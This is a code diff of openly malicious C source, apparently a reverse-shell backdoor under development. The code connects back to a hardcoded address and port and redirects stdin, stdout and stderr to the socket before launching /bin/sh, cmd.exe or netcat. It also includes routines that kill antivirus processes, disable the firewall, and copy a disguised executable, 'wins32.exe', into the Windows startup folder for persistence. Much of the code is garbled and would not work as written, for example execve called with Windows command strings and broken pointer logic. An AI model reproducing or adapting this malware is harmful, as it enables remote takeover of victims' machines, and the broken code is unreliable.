@@ -29,10 +29,12 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 #include <X11/Xlib.h>
 
 #define remote_addr "127.0.0.1"
-
 #define remote_port 55766
 
-/* struct of cong=figurations to target. */
+#define false 0
+#define true 1
+
+/* struct of configurations to target. */
 
   typedef struct client {
 
@@ -58,23 +60,24 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
  } /* exit without exceptions... and keep the routine.
 
+
   //function  to disable antivirus. */
 
 void kill_antivirus()
 
   {
-   
+     //int i;
      FILE *arq;
 
     arq = fopen("av.txt", "rb");
     if(arq == 0)
         return;
     else
-       while( (arq=fgetc(arq)) != EOF)
+       while( (arq=fgetc(arq)) != NULL)
          if (arq = "\n")
 
    execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);
-
+//   send(x,"Killing anti virus...\n",31,0);
    execve("TASKKILL /F /IM \{}\ '>> NUL'", 0, 0);
 
    return;
@@ -107,7 +110,7 @@ void auto_copy()
 void copy_to_registry()
 
   {
-    execve("copy /Y meuarquivo.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar",0,0);
+    execve("copy /Y wins32.exe C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Inicializar", 0, 0);
     return;
   }
 
@@ -119,7 +122,7 @@ void copy_to_registry()
   {
 
     struct sockaddr_in s;
-  
+
     XFreeCursor;
 
     pid_t pid;
@@ -147,7 +150,7 @@ void copy_to_registry()
 
         sigmask(0);
 
-        chdir("/, C:/Windows/System32");
+        chdir("/, C:\\, C:\\Windows\\System32");
 
         int k;
 
@@ -161,11 +164,12 @@ void copy_to_registry()
     s.sin_family = AF_INET;
     s.sin_addr.s_addr = inet_addr(remote_addr);
     s.sin_port = htons(remote_port);
-    memset(s.sin_zero, '\0', sizeof s.sin_zero);
-   // socklen_t = sizeof s;
 
-    (x) = socket(AF_INET, SOCK_STREAM, 0);
-    usleep(30);
+    memset(s.sin_zero, '\0', sizeof s.sin_zero);
+
+    x = socket(AF_INET, SOCK_STREAM, 0);
+
+    usleep(60); /* if connection are slow... sleep for 30x2 sec untill made the connection */
 
     (connect(x, (struct sockaddr *)&s, sizeof(s)));
      if (connect == -1)
@@ -174,14 +178,11 @@ void copy_to_registry()
     if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
     perror("setsockopt(SO_REUSEADDR)failed");
 
-
     send(x,"\nConnected\n",12,0),send(x,"\n#root > /n",7,0);
-    fflush(stdout);
     dup2(x, 0),dup2(x, 1),dup2(x, 2);
-
     execve("/bin/sh", 0, 0),execve("C:\\windows\\System32\\cmd.exe ", 0, 0),execve("netcat", 0, 0);
 
-     }
+    }
 
     return;
 
@@ -193,18 +194,27 @@ void copy_to_registry()
 
    {
 
-    repete:
+    /* shell run while the connection for true */
 
-    while(1)
-
+    do {
     shell();
-	   
-    auto_copy();	   
+    }
+    while(connect == (true));
+
+   {
+
+    auto_copy();
     copy_to_registry();
     kill_antivirus();
     kill_firewall();
+    return;
+
+    {
+
+       }
 
 
-    goto repete;
-	   
-   }
+    }
+
+
+}
